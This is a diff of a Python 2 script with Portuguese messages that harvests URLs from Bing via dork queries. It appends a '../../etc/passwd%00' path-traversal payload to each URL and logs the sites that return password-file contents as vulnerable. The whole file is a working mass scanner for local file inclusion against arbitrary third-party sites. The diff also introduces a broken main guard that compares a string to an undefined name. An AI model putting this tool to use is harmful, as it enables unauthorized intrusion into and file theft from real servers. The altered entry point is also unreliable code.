@@ -7,14 +7,12 @@
 
 import requests, BeautifulSoup, urllib2
 
-
 def Bing(dork):
 
 	page		 = 1
 	list_alert 	 = 0
 	urls		 = []
 	f 			 = open('results.scan', 'a')
-
 	while 1:
 		url = 'http://www.bing.com/search?q={}&first={}'.format(dork, page)
 		user_agent = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"}
@@ -38,7 +36,6 @@ def Bing(dork):
 							pass
 					else:
 						list_alert += 1
-
 		page += 10
 	print len(urls), 'urls encontradas.\n'
 	f.close()
@@ -48,13 +45,9 @@ def Lfi(dork):
 	f = open('vulns.lst', 'a')
 	urls = Bing(dork)
 	vulns = []
-	
 	dirs  = '../../../../../../../../../../etc/passwd%00'
-	user_agent = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"}
-
 	for url in urls:
 		print 'Checando:', url.split(dork)[0]
-
 		try:
 			r = urllib2.urlopen(url+dirs, timeout=5).read()
 			if r.find(':root:') != -1:
@@ -65,24 +58,20 @@ def Lfi(dork):
 					pass
 		except:
 			pass
-
 	if vulns:
 		print '\nVULN\'s ENCONTRADAS:'
 		for vul in vulns:
 			print '[+]', vul
 	f.close()
 
-
 def Dorks():
 	f = open('dorks.lst', 'r')
 	f = f.readlines()
-
 	for line in f:
 		line = line.rstrip('\n')
 		print '\n\nChecando dork:', line, '...\n'
 		Lfi(line)
 
-
-Dorks()
-
-#Lfi('index.php?id=')
+if '__name__' == __main__:
+	Dorks() # Para lista de dorks contida em 'dorks.lst'
+	#Lfi('index.php?id=') # Para pesquisa em dork individual
